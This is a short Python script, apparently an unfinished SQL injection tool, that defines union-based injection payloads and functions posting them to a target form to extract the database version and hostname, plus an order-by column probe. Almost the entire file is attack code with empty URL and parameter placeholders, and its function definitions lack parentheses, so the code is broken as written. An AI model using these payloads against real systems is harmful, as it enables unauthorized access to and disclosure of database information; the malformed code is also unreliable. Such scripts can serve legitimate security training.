"""
"""

import requests

URL = ""
KEY = ""

qVersion = "' or '1'='1' union select @@version #"
qHostname = "' or '1'='1' union select null, @@hostname #"
qCol = "' or '1'='1' order by "


def find_Version:
    """
    """
    
    param = {KEY: qVersion}
    resp = requests.post(URL, param)
    print('Found DB Version: ', resp.content)
    

def find_Hostname:
    """
    """
    
    param = {KEY: qHostname}
    resp = requests.post(URL, param)
    print('Found DB Hostname: ', resp.content)
    








